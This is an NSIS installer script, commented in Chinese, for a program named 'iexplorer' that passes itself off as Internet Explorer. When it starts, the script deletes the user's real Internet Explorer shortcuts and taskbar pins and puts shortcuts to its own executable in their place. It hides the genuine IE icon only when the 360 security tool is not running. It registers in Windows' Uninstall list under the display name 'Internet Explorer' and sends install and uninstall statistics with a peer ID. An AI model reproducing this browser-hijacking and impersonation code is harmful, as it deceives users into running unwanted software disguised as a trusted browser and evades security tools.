;动态获取渠道号
Var str_ChannelID
;---------------------------全局编译脚本预定义的常量-----------------------------------------------------
;安装图标的路径名字
!define MUI_ICON "bin2\iexplore.ico"
;卸载图标的路径名字
!define MUI_UNICON "bin2\iexplore.ico"

!define INSTALL_CHANNELID "0001"

!define PRODUCT_NAME "iexplorer"
!define SHORTCUT_NAME "iexplorer"
!define PRODUCT_VERSION "1.0.0.2"
!define VERSION_LASTNUMBER 2
!define NeedSpace 10240

!define EM_BrandingText "${PRODUCT_NAME}${PRODUCT_VERSION}"
!define PRODUCT_PUBLISHER "iexplorer"
!define PRODUCT_WEB_SITE ""
!define PRODUCT_DIR_REGKEY "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe"
!define PRODUCT_UNINST_KEY "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT_NAME}"
!define PRODUCT_UNINST_ROOT_KEY "HKLM"
!define PRODUCT_MAININFO_FORSELF "Software\${PRODUCT_NAME}"

;卸载包开关（请不要轻易打开）
;!define SWITCH_CREATE_UNINSTALL_PAKAGE 1
!ifdef SWITCH_CREATE_UNINSTALL_PAKAGE
	!define EM_OUTFILE_NAME "uninst.exe"
!else
	!define EM_OUTFILE_NAME "iesetup-${PRODUCT_VERSION}_inner.exe"
!endif

;CRCCheck on
;---------------------------设置软件压缩类型（也可以通过外面编译脚本控制）------------------------------------
SetCompressor /SOLID lzma
SetCompressorDictSize 32
BrandingText "${EM_BrandingText}"
SetCompress force
SetDatablockOptimize on
;XPStyle on
; ------ MUI 现代界面定义 (1.67 版本以上兼容) ------
!include "MUI2.nsh"
!include "WinCore.nsh"
;引用文件函数头文件
!include "FileFunc.nsh"
!include "WinMessages.nsh"
!include "WordFunc.nsh"

!insertmacro MUI_LANGUAGE "SimpChinese"
SetFont 宋体 9
RequestExecutionLevel admin

VIProductVersion ${PRODUCT_VERSION}
VIAddVersionKey /LANG=2052 "ProductName" "${SHORTCUT_NAME}"
VIAddVersionKey /LANG=2052 "Comments" ""
VIAddVersionKey /LANG=2052 "CompanyName" ""
;VIAddVersionKey /LANG=2052 "LegalTrademarks" "GreenShield"
VIAddVersionKey /LANG=2052 "LegalCopyright" "Copyright (c) 2014-2016"
VIAddVersionKey /LANG=2052 "FileDescription" "${SHORTCUT_NAME} 安装程序"
VIAddVersionKey /LANG=2052 "FileVersion" ${PRODUCT_VERSION}
VIAddVersionKey /LANG=2052 "ProductVersion" ${PRODUCT_VERSION}
VIAddVersionKey /LANG=2052 "OriginalFilename" ${EM_OUTFILE_NAME}


;------------------------------------------------------MUI 现代界面定义以及函数结束------------------------
;应用程序显示名字
Name "${SHORTCUT_NAME} ${PRODUCT_VERSION}"
;应用程序输出路径
!ifdef SWITCH_CREATE_UNINSTALL_PAKAGE
	OutFile "bin2\_uninst.exe"
!else
	OutFile "bin2\${EM_OUTFILE_NAME}"
!endif
;InstallDir "$PROGRAMFILES\ldthost"
InstallDirRegKey HKLM "${PRODUCT_UNINST_KEY}" "UninstallString"

Section MainSetup
SectionEnd

Function GetLastPart
  Exch $0 ; chop char
  Exch
  Exch $1 ; input string
  Push $2
  Push $3
  StrCpy $2 0
  loop:
    IntOp $2 $2 - 1
    StrCpy $3 $1 1 $2
    StrCmp $3 "" 0 +3
      StrCpy $0 ""
      Goto exit2
    StrCmp $3 $0 exit1
    Goto loop
  exit1:
    IntOp $2 $2 + 1
    StrCpy $0 $1 "" $2
  exit2:
    Pop $3
    Pop $2
    Pop $1
    Exch $0 ; output string
FunctionEnd

Var boolIsSilent
Function UpdateChanel
	StrCpy $boolIsSilent "false"
	System::Call "kernel32::GetModuleFileName(i 0, t R2R2, i 256) ? u"
	Push $R2
	Push "\"
	Call GetLastPart
	Pop $R1
	${WordFind} "$R1" "_silent" +1 $R5
	${If} $R1 != $R5
		StrCpy $boolIsSilent "true"
	${Else}
		StrCpy $boolIsSilent "false"
	${EndIf}
	${WordFind} "$R1" "_" +2 $R3
	${If} $R3 == 0
	${OrIf} $R3 == ""
		StrCpy $str_ChannelID ${INSTALL_CHANNELID}
	${ElseIf} $R1 == $R3
		StrCpy $str_ChannelID "unknown"
	${Else}
		${WordFind} "$R3" "." +1 $R4
		StrCpy $str_ChannelID $R4
	${EndIf}
	
	ReadRegStr $R0 HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallSource"
	${If} $R0 != 0
	${AndIf} $R0 != ""
	${AndIf} $R0 != "unknown"
		StrCpy $str_ChannelID $R0
	${EndIf}
	WriteRegStr HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallSource" "$str_ChannelID"
FunctionEnd

Function GetCommandLine
	System::Call "kernel32::GetCommandLineA() t.R1"
	System::Call "kernel32::GetModuleFileName(i 0, t R2R2, i 256)"
	${WordReplace} $R1 $R2 "" +1 $R3
	${StrFilter} "$R3" "-" "" "" $R4
FunctionEnd

Var Bool_IsUpdate
Function .onInit
	${If} ${SWITCH_CREATE_UNINSTALL_PAKAGE} == 1 
		WriteUninstaller "$EXEDIR\..\iexplorer\uninst.exe"
		Abort
	${EndIf}
	System::Call "kernel32::CreateMutexA(i 0, i 0, t 'iesetup_{113CFDBC-6426-4b1a-9539-24ADF327AC93}') i .r1 ?e"
	Pop $R0
	StrCmp $R0 0 +2
	Abort
	Call UpdateChanel
	;判断是否覆盖安装
	StrCpy $Bool_IsUpdate 0
	ReadRegStr $2 HKCU "SOFTWARE\${PRODUCT_NAME}" "Path"
	IfFileExists $2 0 StartInstall
		StrCpy $Bool_IsUpdate 1
		${GetFileVersion} $2 $1
		${VersionCompare} $1 ${PRODUCT_VERSION} $3
		${If} $3 == "2" ;已安装的版本低于该版本
			Goto StartInstall
		${ElseIf} $boolIsSilent == "false"
			Call GetCommandLine
			${GetOptions} $R4 "/write"  $R0
			IfErrors 0 +2
			Abort
			Goto StartInstall
		${EndIf}
	StartInstall:
	;判断系统
	SetOutPath "$TEMP\${PRODUCT_NAME}"
	SetOverwrite on
	File "bin\YBSetUpHelper.dll"
	File "ieneed\Microsoft.VC90.CRT.manifest"
	File "ieneed\msvcp90.dll"
	File "ieneed\msvcr90.dll"
	File "ieneed\Microsoft.VC90.ATL.manifest"
	File "ieneed\ATL90.dll"
	
	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r0"
	;${If} $0 == 1
	;	Abort
	;${EndIf}
	;获取安装路径
	StrCpy $1 ${NSIS_MAX_STRLEN}
	StrCpy $0 ""
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetProfileFolder(t) i(.r0).r2"
	;释放exe、xar以及卸载程序
	SetOutPath "$0\${PRODUCT_NAME}"
	SetOverwrite on
	File /r "${PRODUCT_NAME}\*.*"
	;释放xlue及其它相关文件
	SetOutPath "$0\${PRODUCT_NAME}\program"
	SetOverwrite on
	File /r "ieneed\*.*"
	;释放ie配置
	SetOutPath "$0\IECFG"
	SetOverwrite off
	File "ie_config\*.*"
	;拷贝相关文件， 除了YBYL.exe其余都拷贝
	;CopyFiles /silent "$R1\program\*.*" "$R0\${PRODUCT_NAME}\program"
	;Delete "$R0\${PRODUCT_NAME}\program\YBYL.exe"
	;创建图标
	Call CreateDeskIcon
	;刷新图标
	System::Call "shell32::SHChangeNotify(l, l, i, i) v (0x08000000, 0, 0, 0)"
	;释放配置文件（预留）
	;上报
	${If} $Bool_IsUpdate == 0
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'install', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1) "
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installmethod', t '${VERSION_LASTNUMBER}', t '0', i 1) "
	${Else}
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'update', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1)"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'updatemethod', t "${VERSION_LASTNUMBER}", t '0', i 1)"
	${EndIf}  
	
	;写注册表信息
	WriteRegStr HKCU "SOFTWARE\iexplorer" "Path" "$0\iexplorer\program\iexplore.exe"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetPeerID(t) i(.r2).r3"
	WriteRegStr HKCU "SOFTWARE\iexplorer" "PeerId" "$2"
	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallSource" $str_ChannelID
	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstDir" "$0\iexplorer"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetTime(*l) i(.r2).r1"
	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallTimes" "$2"
	
	;写入通用的注册表信息
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe" "" "$0\iexplorer\program\iexplore.exe"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayName" "Internet Explorer"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "UninstallString" "$0\iexplorer\uninst.exe"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayIcon" "$0\iexplorer\program\iexplore.exe"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayVersion" "${PRODUCT_VERSION}"
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "URLInfoAbout" ""
	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "Publisher" "iexplorer"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SoftExit() ? u"
	Abort
FunctionEnd

Function CreateDeskIcon
	StrCpy $1 ${NSIS_MAX_STRLEN}
	StrCpy $0 ""
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetProfileFolder(t) i(.r0).r2"
	SetOutPath "$0\${PRODUCT_NAME}\program"
	;先备份,姑且认为他是真ie
	${If} $Bool_IsUpdate == 0
		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +3
			WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
			Delete "$SMPROGRAMS\Internet Explorer.lnk"
		IfFileExists "$DESKTOP\Internet Explorer.lnk" 0 +3
			WriteRegStr HKCU "SOFTWARE\iexplorer" "DESKTOP" "1"
			Delete "$DESKTOP\Internet Explorer.lnk"
	${EndIf}
	;隐藏IE图标， 判断360进程不在才做
	FindProcDLL::FindProc "360Tray.exe"
	${If} $R0 == 0
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::HideIEIcon(i 1)"
		${If} $Bool_IsUpdate == 0
			WriteRegStr HKCU "SOFTWARE\iexplorer" "HideIEIcon" "1"
		${EndIf}
	${EndIf}
	;入口1
	CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startmenuprograms"
	;入口2
	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::ReplaceIcon(t '$0\${PRODUCT_NAME}\program\iexplore.exe')"
	CreateShortCut "$DESKTOP\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom desktop"
	;入口3
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r2"
	${If} $2 == 1 ;win7
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetUserPinPath(t) i(.r3)"
		${If} $3 != "" 
		${AndIf} $3 != 0
			IfFileExists "$3\TaskBar\Internet Explorer.lnk" 0 +6
				${If} $Bool_IsUpdate == 0
					WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
				${EndIf}
				ExecShell taskbarunpin "$3\TaskBar\Internet Explorer.lnk"
				StrCpy $R0 "$3\TaskBar\Internet Explorer.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
				Sleep 500
			SetOutPath "$0\${PRODUCT_NAME}\program"
			CreateShortCut "$0\${PRODUCT_NAME}\program\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom toolbar"
			ExecShell taskbarpin "$0\${PRODUCT_NAME}\program\Internet Explorer.lnk" "/sstartfrom toolbar"
			IfFileExists "$STARTMENU\Internet Explorer.lnk" 0 +4
				${If} $Bool_IsUpdate == 0
					WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
				${EndIf}
				ExecShell startunpin "$3\StartMenu\Internet Explorer.lnk"
				Sleep 1000
			CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startbar"
			StrCpy $R0 "$STARTMENU\Internet Explorer.lnk"
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
			Sleep 200
			ExecShell startpin "$STARTMENU\Internet Explorer.lnk" "/sstartfrom startbar"
		${EndIf}
	${Else}
		IfFileExists "$QUICKLAUNCH\Internet Explorer.lnk" 0 +3
			${If} $Bool_IsUpdate == 0
				WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
			${EndIf}
			Delete "$QUICKLAUNCH\Internet Explorer.lnk"
		CreateShortCut "$QUICKLAUNCH\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom toolbar" 
		IfFileExists "$STARTMENU\Internet Explorer.lnk" 0 +3
			${If} $Bool_IsUpdate == 0
				WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
			${EndIf}
			Delete "$STARTMENU\Internet Explorer.lnk"
		CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\${PRODUCT_NAME}.exe" "/sstartfrom startbar" 
		SetOutPath "$TEMP\${PRODUCT_NAME}"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$STARTMENU\Internet Explorer.lnk')"
	${EndIf}
	;锁定到任务栏
FunctionEnd

/****************************************************/
;卸载
/****************************************************/
Function un.UpdateChanel
	ReadRegStr $R4 HKCU "SOFTWARE\${PRODUCT_NAME}" "InstallSource"
	${If} $R4 == 0
	${OrIf} $R4 == ""
		StrCpy $str_ChannelID "unknown"
	${Else}
		StrCpy $str_ChannelID $R4
	${EndIf}
FunctionEnd

Function un.DeleteIcon
	;删除
	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::ReductionIcon()"
	IfFileExists "$DESKTOP\Internet Explorer.lnk" 0 +2
		Delete "$DESKTOP\Internet Explorer.lnk"
	IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +2
		Delete "$SMPROGRAMS\Internet Explorer.lnk"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r2"
	${If} $2 == 1 ;win7
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetUserPinPath(t) i(.r3)"
		ExecShell taskbarunpin "$3\TaskBar\Internet Explorer.lnk"
		StrCpy $R0 "$3\TaskBar\Internet Explorer.lnk"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
		Sleep 200
		ExecShell startunpin "$3\StartMenu\Internet Explorer.lnk"
		StrCpy $R0 "$3\StartMenu\Internet Explorer.lnk"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
		Sleep 200
	${Else}
		Delete "$QUICKLAUNCH\Internet Explorer.lnk"
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$STARTMENU\Internet Explorer.lnk')"
	${EndIf}
	;还原
	ReadRegStr $R4 HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE" "path"
	ReadRegStr $R5 HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE" ""
	StrCpy $R6 "0"
	StrCpy $R7 "0"
	StrCpy $R8 "0"
	StrCpy $R9 "0"
	StrCpy $9 "0"
	ReadRegStr $R6 HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH"
	ReadRegStr $R7 HKCU "SOFTWARE\iexplorer" "SMPROGRAMS"
	ReadRegStr $R8 HKCU "SOFTWARE\iexplorer" "STARTMENU"
	ReadRegStr $R9 HKCU "SOFTWARE\iexplorer" "HideIEIcon"
	ReadRegStr $9 HKCU "SOFTWARE\iexplorer" "DESKTOP"
	
	${If} $2 == 1
		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetUserPinPath(t) i(.r3)"
		${If} $3 != "" 
		${AndIf} $3 != 0
			SetOutPath "$R4"
			${If} $R6 == "1" 
				CreateShortCut "$R4\Internet Explorer.lnk" "$R5"
				ExecShell taskbarpin "$R4\Internet Explorer.lnk"
			${EndIf}
			${If} $R8 == "1" 
				CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$R5"
				StrCpy $R0 "$STARTMENU\Internet Explorer.lnk"
				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
				Sleep 200
				ExecShell startpin "$STARTMENU\Internet Explorer.lnk"
			${EndIf}
		${EndIf}
	${Else}
		SetOutPath "$R4"
		${If} $R6 == "1" 
			CreateShortCut "$QUICKLAUNCH\Internet Explorer.lnk" "$R5" 
		${EndIf}
		${If} $R8 == "1" 
			CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$R5" 
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$STARTMENU\Internet Explorer.lnk')"
		${EndIf}
	${EndIf}
	${If} $R7 == "1" 
		CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$R5"
	${EndIf}
	${If} $R9 == "1" 
		FindProcDLL::FindProc "360Tray.exe"
		${If} $R0 == 0
			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::HideIEIcon(i 0)"
		${EndIf}
	${EndIf}
	${If} $9 == "1" 
		CreateShortCut "$DESKTOP\Internet Explorer.lnk" "$R5"
	${EndIf}
FunctionEnd

Function un.onInit
	System::Call "kernel32::CreateMutexA(i 0, i 0, t 'iesetup_{113CFDBC-6426-4b1a-9539-24ADF327AC93}') i .r1 ?e"
	Pop $R0
	StrCmp $R0 0 +2
	Abort
	
	IfFileExists "$INSTDIR\program\Microsoft.VC90.CRT.manifest" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\Microsoft.VC90.CRT.manifest" "$TEMP\${PRODUCT_NAME}\"
	IfFileExists "$INSTDIR\program\msvcp90.dll" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\msvcp90.dll" "$TEMP\${PRODUCT_NAME}\"
	IfFileExists "$INSTDIR\program\msvcr90.dll" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\msvcr90.dll" "$TEMP\${PRODUCT_NAME}\"
	IfFileExists "$INSTDIR\program\ATL90.dll" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\ATL90.dll" "$TEMP\${PRODUCT_NAME}\"
	IfFileExists "$INSTDIR\program\Microsoft.VC90.ATL.manifest" 0 InitFailed
	CopyFiles /silent "$INSTDIR\program\Microsoft.VC90.ATL.manifest" "$TEMP\${PRODUCT_NAME}\"
	Goto +2
	InitFailed:
	Abort
	Call un.UpdateChanel
	SetOutPath "$TEMP\${PRODUCT_NAME}"
	SetOverwrite on
	File "bin\YBSetUpHelper.dll"
	;杀进程
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::KillMyIExplorer()"
	Sleep 500
	;删除图标
	Call un.DeleteIcon
	;刷新图标
	System::Call "shell32.dll::SHChangeNotify(l, l, i, i) v (0x08000000, 0, 0, 0)"
	Sleep 1000
	;删除文件（简单粗暴）
	RMDir /r "$INSTDIR"
	;上报
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'uninstall', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1) "
	;删除自用注册表
	DeleteRegKey HKCU "SOFTWARE\${PRODUCT_NAME}"
	;删除通用注册表
	DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe"
	DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe"
	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SoftExit() ? u"
	Abort
FunctionEnd